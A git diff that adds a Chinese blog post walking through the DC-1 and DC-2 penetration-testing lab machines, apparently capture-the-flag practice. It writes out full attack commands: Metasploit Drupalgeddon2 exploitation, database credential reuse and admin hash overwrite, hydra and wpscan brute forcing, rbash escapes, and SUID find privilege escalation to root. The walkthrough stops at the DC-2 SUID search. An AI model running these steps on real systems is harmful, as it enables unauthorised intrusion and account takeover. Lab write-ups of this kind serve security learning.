@@ -516,4 +516,274 @@
 <p>这下就搞定啦</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>DC1-2靶机复现</title>
+    <url>/2023/07/24/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="DC1-2靶机复现"><a href="#DC1-2靶机复现" class="headerlink" title="DC1-2靶机复现"></a>DC1-2靶机复现</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="flag1——msfconsole使用"><a href="#flag1——msfconsole使用" class="headerlink" title="flag1——msfconsole使用"></a>flag1——msfconsole使用</h3><img src="/2023/07/24/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-1靶机破解.png" style="zoom:150%;">
+
+<p>先用nmap扫描以下（这里是将DC-1靶机和kali都开启并使用NAT连接的情况下并且知道了DC-1靶机的ip域名），同时我们也知道了靶机所开放的端口</p>
+<p>尝试访问</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png"></p>
+<p>看起来很像一个管理系统的登录面板啊，用火狐插件搜罗一下页面信息</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png"></p>
+<p>搜集到如下信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Drupal  7  一种cms</span><br><span class="line">php     5.4.45</span><br><span class="line">apache  2.2.22</span><br><span class="line">jQusery 1.4.4</span><br></pre></td></tr></table></figure>
+
+<p>接下来使用Metasploit找一下是否有漏洞，首先打开工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png"></p>
+<p>我们使用命令查找以下是否有Drupal这种cms的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png"></p>
+<p>发现了好几个CVE漏洞</p>
+<p>以18年的漏洞为例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp    弹出来一个没有有效载荷</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options   查看以下漏洞产生所需参数配置</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png"></p>
+<p>可以发现在必需要求设置为yes的参数里，只有RHOSTS没有值，所以我们将其设置为靶机IP</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.10.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png"></p>
+<p>可以看到参数已经设置成功</p>
+<p>接下来使用run开始攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png"></p>
+<p>出现这样就表示已经连接成功，可以直接上shell了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>输入之后尝试执行命令</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png"></p>
+<p>哎？发现了一个可疑文件：flag1.txt ，使用cat查询flag1.txt</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png"></p>
+<p>flag1.txt告诉我们每一个好的cms都需要一个好的配置文件——你也一样，那我们来康康配置文件</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查查Drupal的配置文件名叫做settings.php，查询看看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -name settings.php</span><br><span class="line">cat ./sites/default/settings.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png"></p>
+<p>可见，我们查到了flag2的内容，同时出来的还有一个数据库的用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里出现了登陆失败，所以我们先试试将普通shell改为交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png"></p>
+<p>再次执行数据库命令</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png"></p>
+<p>可以看到我们成功登陆进了数据库，先看看有啥表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show datebases;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png"></p>
+<p>可以看到一个是系统库，还有一个是自己的，进去查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use drupaldb;      show tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png"></p>
+<p>可以看见是有很多表的，我们浏览并发现了一个可能藏有有用信息的表</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+
+<p>发现了两个用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</span><br><span class="line">Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</span><br></pre></td></tr></table></figure>
+
+<p>看到这个admin还是很兴奋的，因为他应该是管理员账号，但是这个密码应该是加密过的</p>
+<p><strong>法1 修改密码</strong></p>
+<p>既然要修改密码，我们查到Drupal的加密脚本是在&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh目录下，先退出数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
+
+<p>在加密脚本里面我们可以看到能用php加参数运行</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317-16893857433575.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png"></p>
+<p>可以看到脚本给我们显示出了加密之后的密码，现在我们来修改管理员的密码，首先还是进入到数据库和Drupal的表，再修改密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use drupaldb;    update users set pass = &quot;$S$D1UQvb3x7lKoCSX6S9K.r.wB202Lsa/r7fkOj7CelJsSEMFDJjGv&quot; where name = &#x27;admin&#x27; or name = &#x27;Fred&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png"></p>
+<p><strong>法2 添加admin用户</strong></p>
+<p>drupal7版本有个SQL注入的漏洞，可以添加一个admin权限的用户，适用版本7.31以下，我们可以在msf找一下这个工具</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A326.png"></p>
+<p>发现果然是有的：</p>
+<p>然后看一下脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit 34992.py -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A327.png"></p>
+<p>可以通过url下载脚本，这里就不再多说</p>
+<p>尝试登录，在content里面发现了flag3</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png"></p>
+<p>同时flag3告诉了我们一些信息passwd和shadow，明显就是linux的文件</p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>下面有对于etc&#x2F;passwd和etc&#x2F;shadow，讲的非常详细的两篇文章：</p>
+<p><a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释（超详细） (biancheng.net)</a></p>
+<p><a href="http://c.biancheng.net/view/840.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） (biancheng.net)</a></p>
+<p>从两篇文章中我们得知，现在用户的密码存放在&#x2F;etc&#x2F;shadow中，但是这个文件只能用root身份登录，但我们的交互式shell显示出来的只是普通用户，所以这里应该就涉及到了提权</p>
+<p>我们先看看用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png"></p>
+<p>发现了flag4这个用户，但是我们并没有他的密码，所以尝试一下暴力破解</p>
+<p>相关知识的两篇文章：</p>
+<p><a href="https://blog.csdn.net/li528405176/article/details/82810342?ops_request_misc=%7B%22request_id%22:%22165642658616782388078059%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165642658616782388078059&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-82810342-null-null.142%5Ev24%5Econtrol,157%5Ev15%5Enew_3&utm_term=SSH&spm=1018.2226.3001.4187">(6条消息) SSH简介及两种远程登录的方法_ssh @_Jack LDZ的博客-CSDN博客</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程 - 知乎 (zhihu.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.10.135 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322.png"></p>
+<p>我们之前使用nmap扫端口时也发现22端口开放了ssh，这里也爆破出flag4用户的密码是orange，然后我们用kali进行连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh flag4@192.168.10.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png"></p>
+<p>发现好像也没啥</p>
+<h3 id="flag5——suid提权"><a href="#flag5——suid提权" class="headerlink" title="flag5——suid提权"></a>flag5——suid提权</h3><p>但是上面说到，访问&#x2F;etc&#x2F;shadow需要root权限，这也就意味着需要提权</p>
+<p>关于suid提权：</p>
+<p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p>
+<p>利用find命令来查找具有SUID权限的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png"></p>
+<p>find比较常用，可以执行root权限的命令找查文件，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
+
+<p>找查什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上 -exec “&#x2F;bin&#x2F;sh” ;</p>
+<p>关于&#x2F;bin&#x2F;sh的介绍：<a href="https://www.cnblogs.com/fengliu-/p/9999854.html">#!&#x2F;bin&#x2F;sh简介 - feng..liu - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line"> </span><br><span class="line">ls</span><br><span class="line"> </span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325.png"></p>
+<p>终于拿到最后一个flag了，与君共勉。</p>
+<p>以上内容参考大神文章：</p>
+<p><a href="https://blog.csdn.net/l2872253606/article/details/125463013">DC-1靶场搭建及渗透实战详细过程</a></p>
+<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>首先用nmap扫描一下，因为是NAT模式，所以可以直接搜一定范围内的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png"></p>
+<p>我们知道该靶机的mac地址，所以可以很轻松的在扫描出的里面找到IP地址，DC-2靶机地址为192.168.10.136，只有80端口开启了http服务</p>
+<p>但是这个命令只是执行了常见端口的扫描，现在使用全面扫描的命令对目标靶机再次进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.136</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png"></p>
+<p>可以看到除了80端口之外，还有7744开放了ssh服务</p>
+<p>尝试访问，发现访问失败，我们要将靶机的IP地址放在host文件夹下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>
+
+<p>将靶机的IP添加到其中</p>
+<p>这个文件是干什么的呢，根据Windows系统规定，在进行DNS请求以前，Windows系统会先检查自己的Hosts文件中是否有这个地址映射关系，如果有则调用这个  IP地址映射，如果没有再向已知的DNS服务器提出域名解析。 也就是说Hosts的请求级别比DNS高。  C:Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts 是<strong>域名解析文件</strong>。</p>
+<p>我们一开始是没法改写host文件的，所以要改写权限</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34-16898205495855.png"></p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png"></p>
+<p>写入之后就可以成功访问了。</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png"></p>
+<h3 id="flag2——cewl配合wpscan的使用"><a href="#flag2——cewl配合wpscan的使用" class="headerlink" title="flag2——cewl配合wpscan的使用"></a>flag2——cewl配合wpscan的使用</h3><p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png"></p>
+<p>同时得知该网站页面是由wordpress搭建的。也是一种CMS，所以就用metasploit的search找了一下，发现wordpress都是对于特定版本发生的，并且对DC-2靶机探测，但是靶机并没有对应的漏洞，所以就打消了使用框架漏洞的想法。</p>
+<p>页面上就有一个flag，我们直接进行查看，并翻译一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你的常规字典可能无法爆破成功，因此，也许你需要去cewl一个字典。</span><br><span class="line">尽管密码字典越大越好，但是有时你仍然无法爆破出正确密码</span><br><span class="line">登录去查看下一个flag</span><br><span class="line">如果你无法发现flag，登录另一个</span><br><span class="line">这里提示我们cewl一个密码字典，kali走起</span><br></pre></td></tr></table></figure>
+
+<p>提示了cewl，所以就上网看了看，这是kali自带的密码字典生成工具</p>
+<p>既然要用cewl生成字典，那么就要找到登录框，使用dirb挖掘一下目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://dc-2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png"></p>
+<p>尝试对于+号开头的进行访问，很快就找到了登陆界面：</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png"></p>
+<p>同时由于wordpress这种热门的搭建博客的CMS，在这里也就知道了一个新工具，wpscan（一种专门针对于wordpress的扫描工具），这里就简单说一下其参数：</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png"></p>
+<p>接下来用wpscan枚举一下用户名：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u      //枚举用户名字</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png"></p>
+<p>扫描出的三个用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">jerry</span><br><span class="line">tom</span><br></pre></td></tr></table></figure>
+
+<p>知道用户名，并结合flag1的提示，我们使用cewl进行密码字典的生成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2 -w passwd.txt</span><br></pre></td></tr></table></figure>
+
+<p>在对应目录下就生成了密码字典</p>
+<p>接下来将用户名输出到一个文件里，方便我们使用wpscan进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;admin&quot; &gt; user.txt</span><br><span class="line">echo &quot;jerry&quot; &gt;&gt; user.txt</span><br><span class="line">echo &quot;tom&quot; &gt;&gt; user.txt</span><br></pre></td></tr></table></figure>
+
+<p>再使用wpscan进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U user.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png"></p>
+<p>可以看到爆破出了两个用户名和其对应的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jerry/adipiscing</span><br><span class="line">tom/parturient</span><br></pre></td></tr></table></figure>
+
+<p>尝试登录，注：这里可能在登录成功之后跳转到了一个空白页面，需要我们手动在url里面输入：<a href="http://dc-2/wp-admin/">http://dc-2/wp-admin/</a></p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png"></p>
+<p>在页面里面到处找找就发现了flag2。</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png"></p>
+<p>flag2的内容告诉我们：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wordpress已经没有什么了，让我们尝试其他的方法</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>框架相关已经没了，另一条路是什么呢，这时我们想起靶机的7744端口还开放了ssh服务，还是尝试之前爆破出来的用户名和密码尝试登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jerry@192.168.10.136 -p 7744</span><br></pre></td></tr></table></figure>
+
+<p>输了几次对应密码都不对，就尝试使用tom进行登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh tom@192.168.10.136 -p 7744</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png"></p>
+<p>可以看到登录成功，接下来使用ls发现了flag3.txt，再使用cat命令查看文件内容，但是发现命令被禁用了</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compgen -c       //查看可以使用的指令</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png"></p>
+<p>发现很多命令都可以，但是我们比较熟知的就是vi，使用vi进行查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi flag3.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png"></p>
+<p>拿到flag3的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
+
+<p>提示我们需要su来切换用户</p>
+<h3 id="flag4——vi提权"><a href="#flag4——vi提权" class="headerlink" title="flag4——vi提权"></a>flag4——vi提权</h3><p>除了vi提权，还有一种就是使用自己定义的bash对rbash进行逃逸</p>
+<p>这里有一篇rbash讲的很好的文章：</p>
+<p><a href="https://blog.csdn.net/qq_43168364/article/details/111830233?ops_request_misc=%7B%22request_id%22:%22162719543816780366532696%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=162719543816780366532696&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-4-111830233.pc_v2_rank_blog_default&utm_term=-rbash&spm=1018.2226.3001.4450">(6条消息) 【渗透测试】— rbash逃逸方法简述_rbash 命令_通地塔的博客-CSDN博客</a></p>
+<p>直接进行切换：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png"></p>
+<p>还是收到了rbash限制，所以就需要进行vi提权（使用vi进入任意文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi 123</span><br></pre></td></tr></table></figure>
+
+<p>然后在末行模式下使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ..  //退回上级目录</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png"></p>
+<p>发现了jerry目录，进入其中，并ls一下</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png"></p>
+<p>还是使用vi查看一下：</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you’ve made it this far - but you’re not home yet.You still need to get the final flag (the only flag that really counts!!!).No hints here - you’re on your own now. :-)Go on - git outta here!!!</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet.</span><br><span class="line">很高兴看到你走了这么远-但你还没回家。</span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).</span><br><span class="line">你仍然需要得到最终的标志（唯一真正重要的标志！！！） # 就是root嘛，懂的</span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line">这里没有提示-你现在只能靠自己了。：-）</span><br><span class="line">Go on - git outta here!!!!</span><br><span class="line">去吧，离这里远点 #是用 git 提权吗</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag5——git提权"><a href="#flag5——git提权" class="headerlink" title="flag5——git提权"></a>flag5——git提权</h3><p>所以就要切换到root用户</p>
+<p>直接切是切不了的</p>
+<p>在这里使用上面文章的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export -p        //查看环境变量</span><br><span class="line">BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a</span><br><span class="line">/bin/bash</span><br><span class="line">export PATH=$PATH:/bin/         //添加环境变量</span><br><span class="line">export PATH=$PATH:/usr/bin      //添加环境变量</span><br><span class="line"></span><br><span class="line">提权成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322-169009707507011.png"></p>
+<p>发现做完这些还是进不去</p>
+<p>这时候我们想到了suid，用命令看看有哪些是具有suid的可执行文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png"></p>
